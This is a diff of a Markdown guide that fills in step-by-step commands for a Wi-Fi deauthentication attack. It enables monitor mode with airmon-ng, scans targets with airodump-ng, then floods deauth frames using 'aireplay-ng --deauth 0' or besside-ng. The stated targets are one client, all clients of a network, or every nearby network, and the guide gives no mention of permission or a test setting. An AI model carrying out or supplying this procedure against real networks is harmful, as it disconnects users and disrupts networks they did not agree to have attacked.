@@ -7,16 +7,82 @@ The **Deauth** attack perform on Wi-Fi (802.11) network only. It won't affect th
 - [x] Attack on **all clients** of a particular Wi-Fi's network (if don't know any client's MAC address)
 - [x] Attack on **all Wi-Fi** available networks/routers directly.
 
-> But to attack on Ethernet using clients, the methods are : ARP Spoofing / ARP Poisoning (Man-in-the-Middle Attack), DHCP Starvation or Rogue DHCP Attack, Switch MAC Flooding (CAM Table Overflow). But these we won't learn here, or maybe we'll learn it later.
+> But to attack on Ethernet cable using clients, the methods are : ARP Spoofing / ARP Poisoning (Man-in-the-Middle Attack), DHCP Starvation or Rogue DHCP Attack, Switch MAC Flooding (CAM Table Overflow). But these we won't learn here, or maybe we'll learn it later.
 
-
+`~$` is local user.  
+`~#` is root user.  
 
 
 
 
 #### Step 1 : 
-asdf asdf
-`asdf`
+First we need to convert the wlan0 interface to wlan0mon interface, basically we are do setup & enabling the Wi-Fi's monitoring mode to do attack. For this we use the following commands :  
+```
+sudo su
+iwconfig
+airmon-ng
+iwconfig wlan0
+// airmon-ng start wlan0
+airmon-ng check kill (2 times) . . .
+airmon-ng stop wlan0 . . .
+iw wlan0 del
+airmon-ng start wlan0mon
+iwconfig
+rfkill list
+
+clear
+exit
+exit
+```
+Run the above commands one-by-one only.  
+<br>
+
+
+#### Step 2 : 
+Now run the following commands :  
+```
+airodump-ng wlan0mon
+
+- - -ctrl + C to stop
+- - -Can close if don't work
+```
+So, when it dispaly the required network then we can stop the process with 'ctrl + C' shortcut. But don't close this tab, it helps to copy network's channel no. & BSSID.  
+<br>
+
+
+#### Step 3 :  
+Now open new terminal tab and run the following commands :  
+```
+sudo su
+
+airodump-ng wlan0mon --bssid "_" -c "_"
+	(OR)
+airodump-ng --bssid "_" -c "_" wlan0mon
+	(OR)
+airodump-ng -c_ -d "__BSS-ID__" wlan0mon
+
+- - - - -Keep running, don't close
+```
+**Don't close it, keep running**. So, here we need to mentioned a particular Wi-Fi network's BSSID & channel no. And from this we are setting to attack on a particular Wi-Fi network. If want to attack all network then don't mention BSSID & channel no.
+<br>
+
+
+#### Step 4 :  
+Now open new terminal tab and run the following commands :  
+```
+sudo
+
+aireplay-ng --deauth 0 -a "___BSS-ID___" -c "__STATION__" wlan0mon
+	(OR)
+besside-ng -c "_" wlan0mon
+
+
+- - - - -ctrl + C ----😁
+```
+Here, if we want to attack all then don't mention BSSID & station of any client.
+
+
+
 
 
 
